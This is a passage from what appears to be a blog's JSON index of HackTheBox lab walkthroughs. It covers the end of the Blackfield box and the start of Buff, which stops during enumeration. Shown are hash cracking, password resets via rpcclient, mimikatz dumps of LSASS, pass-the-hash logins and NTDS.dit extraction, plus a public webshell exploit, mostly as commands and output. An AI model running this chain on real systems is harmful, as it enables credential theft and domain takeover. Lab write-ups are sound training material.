$krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f788d565face046beea93$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set    Time to crack the hash.   we can user any hash cracker of our choice, here I’ve used hashcat to crack the hash.   hashcat.exe -m 18200 hash.txt D:\\rockyou.txt hashcat (v6.0.0) starting...  * Device #1: Unstable OpenCL driver detected!  This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives. You can use --force to override this, but do not report related errors.  * Device #3: CUDA SDK Toolkit installation NOT detected.              CUDA SDK Toolkit installation required for proper device support and utilization              Falling back to OpenCL Runtime  * Device #3: WARNING! Kernel exec timeout is not disabled.              This may cause \"CL_OUT_OF_RESOURCES\" or related errors.              To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported  OpenCL API (OpenCL 2.1 ) - Platform #1 [Intel(R) Corporation] ============================================================= * Device #1: Intel(R) HD Graphics 530, skipped * Device #2: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped  OpenCL API (OpenCL 1.2 CUDA 9.1.112) - Platform #2 [NVIDIA Corporation] ======================================================================= * Device #3: GeForce GTX 950M, 3392/4096 MB (1024 MB allocatable), 5MCU  Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256  Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1  Applicable optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt  ATTENTION! Pure (unoptimized) backend kernels selected. Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance. If you want to switch to optimized backend kernels, append -O to your commandline. See the above message to find out about the exact limits.  Watchdog: Temperature abort trigger set to 90c  Host memory required for this attack: 151 MB  Dictionary cache built: * Filename..: D:\\rockyou.txt * Passwords.: 14344394 * Bytes.....: 139921528 * Keyspace..: 14344387 * Runtime...: 2 secs  Cracking performance lower than expected?  * Append -O to the commandline.   This lowers the maximum supported password- and salt-length (typically down to 32).  * Append -w 3 to the commandline.   This can cause your screen to lag.  * Update your backend API runtime / driver the right way:   https://hashcat.net/faq/wrongdriver  * Create more work items to make use of your parallelization power:   https://hashcat.net/faq/morework  $krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f788d565face046beea93$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d:#00^BlackKnight  Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f...6ab74d Time.Started.....: Sat Jul 11 18:57:49 2020 (7 secs) Time.Estimated...: Sat Jul 11 18:57:56 2020 (0 secs) Guess.Base.......: File (D:\\rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#3.........:  2173.1 kH/s (7.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 14336000/14344387 (99.94%) Rejected.........: 0/14336000 (0.00%) Restore.Point....: 14295040/14344387 (99.66%) Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#3....: *toille*1410* -&gt; #!kayla Hardware.Mon.#3..: Temp: 54c Util: 47% Core: 928MHz Mem:2505MHz Bus:16  Started: Sat Jul 11 18:57:33 2020 Stopped: Sat Jul 11 18:57:57 2020   $krb5asrep$23$support@BLACKFIELD.LOCAL:2ce9f8bdad0f788d565face046beea93$49841d0598a23eba7657d2eb175721e77936ef2f324308f887c0eaf9f64b6ffe070aeefe315c397f786ec32f0122bf9e111f26d55c7f3935e18a84e20912be112b4c652a03e046f9dfa55af35c5e8485297686d08572291ea3266b5a3143e0ce6aa5bd8d9d2486e29130a1c45092f1c1ac4df174eeea98a37e7f4202d18134d7ea8b8c335db352a8821c5d25ad03c51feb9b1d7a3bf3ae6494994d9d058acd742cbe68976c46772bd97a55f411f792f27dafe01528dc1c24b99bb345653db6b77625a781aa9f7f0db9429035afe6c20b0a959e5eafc4b9a70df78fe6eae3c01d2cd4899c1faec2fc4a0aed13e8c9445a196ab74d:#00^BlackKnight   So the password of support is #00^BlackKnight   As I got the password of support I tried to login in via evil-winrm but no luck. Then I decided to use rpcclient to enumerate further.   rpcclient blackfield.htb -U support  Enter WORKGROUP\\support's password:  rpcclient $&gt;   rpcclient $&gt; enumprivs found 35 privileges  SeCreateTokenPrivilege          0:2 (0x0:0x2) SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3) SeLockMemoryPrivilege           0:4 (0x0:0x4) SeIncreaseQuotaPrivilege                0:5 (0x0:0x5) SeMachineAccountPrivilege               0:6 (0x0:0x6) SeTcbPrivilege          0:7 (0x0:0x7) SeSecurityPrivilege             0:8 (0x0:0x8) SeTakeOwnershipPrivilege                0:9 (0x0:0x9) SeLoadDriverPrivilege           0:10 (0x0:0xa) SeSystemProfilePrivilege                0:11 (0x0:0xb) SeSystemtimePrivilege           0:12 (0x0:0xc) SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd) SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe) SeCreatePagefilePrivilege               0:15 (0x0:0xf) SeCreatePermanentPrivilege              0:16 (0x0:0x10) SeBackupPrivilege               0:17 (0x0:0x11) SeRestorePrivilege              0:18 (0x0:0x12) SeShutdownPrivilege             0:19 (0x0:0x13) SeDebugPrivilege                0:20 (0x0:0x14) SeAuditPrivilege                0:21 (0x0:0x15) SeSystemEnvironmentPrivilege            0:22 (0x0:0x16) SeChangeNotifyPrivilege                 0:23 (0x0:0x17) SeRemoteShutdownPrivilege               0:24 (0x0:0x18) SeUndockPrivilege               0:25 (0x0:0x19) SeSyncAgentPrivilege            0:26 (0x0:0x1a) SeEnableDelegationPrivilege             0:27 (0x0:0x1b) SeManageVolumePrivilege                 0:28 (0x0:0x1c) SeImpersonatePrivilege          0:29 (0x0:0x1d) SeCreateGlobalPrivilege                 0:30 (0x0:0x1e) SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f) SeRelabelPrivilege              0:32 (0x0:0x20) SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21) SeTimeZonePrivilege             0:34 (0x0:0x22) SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23) SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)  Checking the privileges of support using rpcclient, I came to see that support can change the password of the other users.      This link can help in understanding this in more detail https://malicious.link/post/2017/reset-ad-user-password-with-linux/.    Using rpcclient to change the password of audit2020.   rpcclient $&gt; setuserinfo2 audit2020 23 'Password@123'   So I’ve successfully changed the password of audit2020.   From the smb enumeration in the starting, there is a folder called forensic, with the help of user audit2020 I can see the things in it.   root@Ac3:~# smbclient  //blackfield.htb/forensic -U audit2020 Enter WORKGROUP\\audit2020's password:  Try \"help\" to get a list of possible commands. smb: \\&gt; ls   .                                   D        0  Sun Feb 23 08:03:16 2020   ..                                  D        0  Sun Feb 23 08:03:16 2020   commands_output                     D        0  Sun Feb 23 13:14:37 2020   memory_analysis                     D        0  Thu May 28 16:28:33 2020   tools                               D        0  Sun Feb 23 08:39:08 2020                  7846143 blocks of size 4096. 3821004 blocks available smb: \\&gt;    As we can see that that thing works.   Checking Juicy Info   smb: \\&gt; cd commands_output smb: \\commands_output\\&gt; ls   .                                   D        0  Sun Feb 23 13:14:37 2020   ..                                  D        0  Sun Feb 23 13:14:37 2020   domain_admins.txt                   A      528  Sun Feb 23 08:00:19 2020   domain_groups.txt                   A      962  Sun Feb 23 07:51:52 2020   domain_users.txt                    A    16454  Fri Feb 28 17:32:17 2020   firewall_rules.txt                  A   518202  Sun Feb 23 07:53:58 2020   ipconfig.txt                        A     1782  Sun Feb 23 07:50:28 2020   netstat.txt                         A     3842  Sun Feb 23 07:51:01 2020   route.txt                           A     3976  Sun Feb 23 07:53:01 2020   systeminfo.txt                      A     4550  Sun Feb 23 07:56:59 2020   tasklist.txt                        A     9990  Sun Feb 23 07:54:29 2020                  7846143 blocks of size 4096. 3821004 blocks available smb: \\commands_output\\&gt; cd .. smb: \\&gt; cd memory_analysis smb: \\memory_analysis\\&gt; ls   .                                   D        0  Thu May 28 16:28:33 2020   ..                                  D        0  Thu May 28 16:28:33 2020   conhost.zip                         A 37876530  Thu May 28 16:25:36 2020   ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020   dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020   dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020   ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020   lsass.zip                           A 41936098  Thu May 28 16:25:08 2020   mmc.zip                             A 64288607  Thu May 28 16:25:25 2020   RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020   ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020   sihost.zip                          A 33141744  Thu May 28 16:27:00 2020                                                                                                                                                                    smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020                                                                                                                                                                    svchost.zip                         A 14408833  Thu May 28 16:27:19 2020                                                                                                                                                                    taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020                                                                                                                                                                    winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020                                                                                                                                                                    wlms.zip                            A  4067425  Thu May 28 16:27:44 2020                                                                                                                                                                    WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020                                                                                                                                                                                                                                                                                                                                                                                                                              7846143 blocks of size 4096. 3821004 blocks available                                                                                                                                                                       smb: \\memory_analysis\\&gt;    So from the above we can see lsass.zip in memory_analysis folder, now I can extract the lsass.zip and use mimikatz to get the NTLM hash.   oot@Ac3:~# smbclient  //blackfield.htb/forensic -U audit2020                                                                                                                                                                               Enter WORKGROUP\\audit2020's password:  Try \"help\" to get a list of possible commands. smb: \\&gt; cd memory_analysis smb: \\memory_analysis\\&gt; get lsass.zip parallel_read returned NT_STATUS_IO_TIMEOUT smb: \\memory_analysis\\&gt; get lsass.zip getting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip getting file \\memory_analysis\\lsass.zip of size 41936098 as lsass.zip (1099.1 KiloBytes/sec) (average 1099.1 KiloBytes/sec) smb: \\memory_analysis\\&gt;   Using Mimikatz   There are many blogs which are helpful how to use mimikatz for hashdump from lsass    mimikatz_trunk\\x64&gt;mimikatz.exe    .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59  .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)  ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  ## \\ / ##       &gt; http://blog.gentilkiwi.com/mimikatz  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/  mimikatz # sekurlsa::minidump lsass.DMP Switch to MINIDUMP : 'lsass.DMP'  mimikatz # sekurlsa::logonpasswords Opening : 'lsass.DMP' file for minidump...  Authentication Id : 0 ; 406458 (00000000:000633ba) Session           : Interactive from 2 User Name         : svc_backup Domain            : BLACKFIELD Logon Server      : DC01 Logon Time        : 2/23/2020 11:30:03 PM SID               : S-1-5-21-4194615774-2175524697-3563712290-1413         msv :          [00000003] Primary          * Username : svc_backup          * Domain   : BLACKFIELD          * NTLM     : 9658d1d1dcd9250115e2205d9f48400d          * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c          * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621         tspkg :         wdigest :          * Username : svc_backup          * Domain   : BLACKFIELD          * Password : (null)         kerberos :          * Username : svc_backup          * Domain   : BLACKFIELD.LOCAL          * Password : (null)         ssp :         credman :  Authentication Id : 0 ; 153705 (00000000:00025869) Session           : Interactive from 1 User Name         : Administrator Domain            : BLACKFIELD Logon Server      : DC01 Logon Time        : 2/23/2020 11:29:04 PM SID               : S-1-5-21-4194615774-2175524697-3563712290-500         msv :          [00000003] Primary          * Username : Administrator          * Domain   : BLACKFIELD          * NTLM     : 7f1e4ff8c6a8e6b6fcae2d9c0572cd62          * SHA1     : db5c89a961644f0978b4b69a4d2a2239d7886368          * DPAPI    : 240339f898b6ac4ce3f34702e4a89550         tspkg :         wdigest :          * Username : Administrator          * Domain   : BLACKFIELD          * Password : (null)         kerberos :          * Username : Administrator          * Domain   : BLACKFIELD.LOCAL          * Password : (null)         ssp :         credman :  Authentication Id : 0 ; 40310 (00000000:00009d76) Session           : Interactive from 1 User Name         : DWM-1 Domain            : Window Manager Logon Server      : (null) Logon Time        : 2/23/2020 11:27:46 PM SID               : S-1-5-90-0-1         msv :          [00000003] Primary          * Username : DC01$          * Domain   : BLACKFIELD          * NTLM     : b624dc83a27cc29da11d9bf25efea796          * SHA1     : 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d         tspkg :         wdigest :          * Username : DC01$          * Domain   : BLACKFIELD          * Password : (null)         kerberos :          * Username : DC01$          * Domain   : BLACKFIELD.local          * Password : &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6         ssp :         credman :    Authentication Id : 0 ; 406499 (00000000:000633e3) Session           : Interactive from 2 User Name         : svc_backup Domain            : BLACKFIELD Logon Server      : DC01 Logon Time        : 2/23/2020 11:30:03 PM SID               : S-1-5-21-4194615774-2175524697-3563712290-1413         msv :          [00000003] Primary          * Username : svc_backup          * Domain   : BLACKFIELD          * NTLM     : 9658d1d1dcd9250115e2205d9f48400d          * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c          * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621         tspkg :         wdigest :          * Username : svc_backup          * Domain   : BLACKFIELD          * Password : (null)         kerberos :          * Username : svc_backup          * Domain   : BLACKFIELD.LOCAL          * Password : (null)         ssp :         credman :     At this point I was a little exited as I got the Admin  hash, But yeah Don't expect anything to be simple.  So I tried to crack the hash of SVC-Backup but no luck, So I tried to pass the hash using Evil-winrm.   ` evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfield.htb`   It was a Success!    evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i blackfiled.htb   Evil-WinRM shell v2.3  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\svc_backup\\Documents&gt;  Getting User.txt  *Evil-WinRM* PS C:\\Users\\svc_backup&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\svc_backup\\Desktop&gt; type user.txt 3e666----------------------------30a               Privilege Escalation   Seeing the privileges of svc-backup   *Evil-WinRM* PS C:\\Users\\svc_backup\\Desktop&gt; whoami /all  USER INFORMATION                                                                                                                                                                             ---------------- User Name             SID                                                                                                                                                                                                                   ===================== ============================================== blackfield\\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413                                                                                                                                                                      GROUP INFORMATION                                                                                                                                                                                                                           -----------------  Group Name                                 Type             SID          Attributes                                                                                                                                                         ========================================== ================ ============ ================================================== Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group BUILTIN\\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level       Label            S-1-16-12288   PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeBackupPrivilege             Back up files and directories  Enabled SeRestorePrivilege            Restore files and directories  Enabled SeShutdownPrivilege           Shut down the system           Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled   USER CLAIMS INFORMATION -----------------------  User claims unknown.  Kerberos support for Dynamic Access Control on this device has been disabled.   Enumerating you will find notes.txt and since svc_backup has backup ability robocopy can be exploited in a way.   https://pentestlab.blog/tag/diskshadow/   root@Ac3:~# cat jeevan.txt  SET CONTEXT PERSISTENT NOWRITERS# add volume c: alias jeevan# createp# expose %jeevan% z:#    *Evil-WinRM* PS C:\\Windows\\temp&gt; diskshadow /s jeevan.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer:  DC01,  7/11/2020 2:44:35 PM  -&gt; SET CONTEXT PERSISTENT NOWRITERS -&gt; add volume c: alias jeevan -&gt; create Alias jeevan for shadow ID {64f5cc48-8cd1-4d3a-9393-504db85af469} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {95cfeba5-f3b5-43bc-ad73-c6bcee2bc475} set as environment variable.  Querying all shadow copies with the shadow copy set ID {95cfeba5-f3b5-43bc-ad73-c6bcee2bc475}          * Shadow copy ID = {64f5cc48-8cd1-4d3a-9393-504db85af469}               %jeevan%                 - Shadow copy set: {95cfeba5-f3b5-43bc-ad73-c6bcee2bc475}       %VSS_SHADOW_SET%                 - Original count of shadow copies = 1                 - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\]                 - Creation time: 7/11/2020 2:44:35 PM                 - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1                 - Originating machine: DC01.BLACKFIELD.local                 - Service machine: DC01.BLACKFIELD.local                 - Not exposed                 - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}                 - Attributes:  No_Auto_Release Persistent No_Writers Differential  Number of shadow copies listed: 1 -&gt; expose %jeevan% z: -&gt; %jeevan% = {64f5cc48-8cd1-4d3a-9393-504db85af469} The shadow copy was successfully exposed as z:\\. -&gt; *Evil-WinRM* PS C:\\Windows\\temp&gt; ls       Directory: C:\\Windows\\temp   Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -a----        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab -a----        7/11/2020   2:44 PM             90 jeevan.txt -a----        7/11/2020   1:13 PM         135470 MpCmdRun.log -a----        7/11/2020  12:42 PM            102 silconfig.log ------        7/11/2020  12:42 PM          63072 vmware-vmsvc.log ------        7/11/2020  12:43 PM          15832 vmware-vmusr.log -a----        7/11/2020  12:42 PM           1728 vmware-vmvss.log   *Evil-WinRM* PS C:\\Windows\\temp&gt;    At this point I realised the privs of svc-backup   PRIVILEGES INFORMATION ----------------------  Privilege Name                Description                    State ============================= ============================== ======= SeMachineAccountPrivilege     Add workstations to domain     Enabled SeBackupPrivilege             Back up files and directories  Enabled SeRestorePrivilege            Restore files and directories  Enabled SeShutdownPrivilege           Shut down the system           Enabled SeChangeNotifyPrivilege       Bypass traverse checking       Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  To get the NTDS.dit I need to fool the system in order to do so.   https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug   After Uploading both the .dll files.   *Evil-WinRM* PS C:\\Windows\\temp&gt; upload SeBackupPrivilegeCmdLets.dll Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\\Windows\\temp\\SeBackupPrivilegeCmdLets.dll                                                                Data: 16384 bytes of 16384 bytes copied  Info: Upload successful!  *Evil-WinRM* PS C:\\Windows\\temp&gt; upload SeBackupPrivilegeUtils.dll Info: Uploading SeBackupPrivilegeUtils.dll to C:\\Windows\\temp\\SeBackupPrivilegeUtils.dll                                                                Data: 21844 bytes of 21844 bytes copied  Info: Upload successful!  *Evil-WinRM* PS C:\\Windows\\temp&gt;   Time to import the modules.      *Evil-WinRM* PS C:\\Windows\\temp&gt; import-module .\\SeBackupPrivilegeUtils.dll *Evil-WinRM* PS C:\\Windows\\temp&gt; import-module .\\SeBackupPrivilegeCmdLets.dll    Time to copy NTDS.dit   *Evil-WinRM* PS C:\\Windows\\temp&gt; Copy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\Windows\\temp\\ndts.dit *Evil-WinRM* PS C:\\Windows\\temp&gt; ls       Directory: C:\\Windows\\temp   Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -a----        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab -a----        7/11/2020   2:44 PM             90 jeevan.txt -a----        7/11/2020   1:13 PM         135470 MpCmdRun.log -a----        7/11/2020   2:56 PM       18874368 ndts.dit -a----        7/11/2020   2:54 PM          12288 SeBackupPrivilegeCmdLets.dll -a----        7/11/2020   2:54 PM          16384 SeBackupPrivilegeUtils.dll -a----        7/11/2020  12:42 PM            102 silconfig.log ------        7/11/2020  12:42 PM          63072 vmware-vmsvc.log ------        7/11/2020  12:43 PM          15832 vmware-vmusr.log -a----        7/11/2020  12:42 PM           1728 vmware-vmvss.log   *Evil-WinRM* PS C:\\Windows\\temp&gt;     File successfully copied…  -a----        7/11/2020   2:56 PM       18874368 ndts.dit   Having only NTDS.dit is not going to help, so i need one more file ie SYSTEM   *Evil-WinRM* PS C:\\Windows\\temp&gt; reg save hklm\\system C:\\Windows\\temp\\system.bak The operation completed successfully.  *Evil-WinRM* PS C:\\Windows\\temp&gt; ls       Directory: C:\\Windows\\temp   Mode                LastWriteTime         Length Name ----                -------------         ------ ---- -a----        7/11/2020   2:44 PM            628 2020-07-11_14-44-35_DC01.cab -a----        7/11/2020   2:44 PM             90 jeevan.txt -a----        7/11/2020   1:13 PM         135470 MpCmdRun.log -a----        7/11/2020   2:56 PM       18874368 ndts.dit -a----        7/11/2020   2:54 PM          12288 SeBackupPrivilegeCmdLets.dll -a----        7/11/2020   2:54 PM          16384 SeBackupPrivilegeUtils.dll -a----        7/11/2020  12:42 PM            102 silconfig.log -a----        7/11/2020   3:01 PM       17346560 system.bak ------        7/11/2020  12:42 PM          63072 vmware-vmsvc.log ------        7/11/2020  12:43 PM          15832 vmware-vmusr.log -a----        7/11/2020  12:42 PM           1728 vmware-vmvss.log   *Evil-WinRM* PS C:\\Windows\\temp&gt;   As I’ve got both the required files, now its time to download the files to dump secrets..   *Evil-WinRM* PS C:\\Windows\\Temp&gt; download ndts.dit Info: Downloading C:\\Windows\\Temp\\ndts.dit to ndts.dit  Progress: 11% : |▒░░░░░░░░░|    *Evil-WinRM* PS C:\\Windows\\temp&gt; download system.bak Info: Downloading C:\\Windows\\temp\\system.bak to system.bak  Progress: 6% : |▒░░░░░░░░░░|          Wait till the procress is completed.   Dumping NTLM   Using impacket for secretdump   secretsdump.py -ntds ntds.dit -system system.bak LOCAL   secretsdump.py  -ntds ndts.dit -system system.bak LOCAL Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation  [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ndts.dit  Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5::: support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: BLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c::: BLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::  Time to get root access   Getting Root.txt   evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u Administrator -i blackfiled.htb    root@Ac3:~# evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i blackfiled.htb  Evil-WinRM shell v2.3  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd .. *Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt 4375a------------------------5cb     If you like my work, please do consider giving me +rep on HACKTHEBOX.  My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968   ","categories": ["hackthebox"],
        "tags": ["windows","activedirectory","evilwinrm","smb","rpcclient","mimikatz","lsass","impacket","hashcat"],
        "url": "/hackthebox/Blackfield/",
        "teaser": "/assets/images/sample/blackfield/blackfield.png"
      },{
        "title": "HackTheBox Buff",
        "excerpt":"Info                  Buff                               OS:       Windows                 Difficulty:       Easy                 Points:       20                 Release:       18 Jul 2020                 IP:       10.10.10.198           Let’s get started   As always hacking starts with NMAP scan.  nmap -sV -Pn -sC -A -T4 buff.htb  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 05:58 EDT Nmap scan report for buff.htb (10.10.10.198) Host is up (0.19s latency). Not shown: 999 filtered ports PORT     STATE SERVICE VERSION 8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n's Bro Hut Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows XP|7 (86%) OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_7 Aggressive OS guesses: Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops  TRACEROUTE (using port 8080/tcp) HOP RTT       ADDRESS 1   195.99 ms 10.10.14.1 2   196.06 ms buff.htb (10.10.10.198)  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.75 seconds     Finding the CVE from Exploit-db   https://www.exploit-db.com/exploits/48506   Using the Exploit   python 48506.py              /\\ /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================\"             \\/                                                                                                                                                                                                                                                                                                                                                                                                                                                                          (+) Usage:       python 48506.py &lt;WEBAPP_URL&gt;                                                                                                                                                                                               (+) Example:     python 48506.py 'https://10.0.0.3:443/gym/'    Exploiting…..   python 48506.py http://buff.htb:8080/                                                                                                                                                                                             /\\                                                                                                                                                                                                                              /vvvvvvvvvvvv \\--------------------------------------,                                                                                                                                                                                      `^^^^^^^^^^^^ /============BOKU=====================\"                                                                                                                                                                                                   \\/                                                                                                                                                                                                                                                                                                                                                                                                                                                                          [+] Successfully connected to webshell.                                                                                                                                                                                                     C:\\xampp\\htdocs\\gym\\upload&gt;                Getting User.txt   C:\\xampp\\htdocs\\gym\\upload&gt; whoami /all                                                                                                                                                                                                     �PNG                                                                                                                                                                                                                                        ▒                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       USER INFORMATION ----------------  User Name  SID                                            ========== ============================================== buff\\shaun S-1-5-21-2277156429-3381729605-2640630771-1001   GROUP INFORMATION -----------------  Group Name                             Type             SID          Attributes                                         ====================================== ================ ============ ================================================== Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group BUILTIN\\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization         Well-known group S-1-5-15     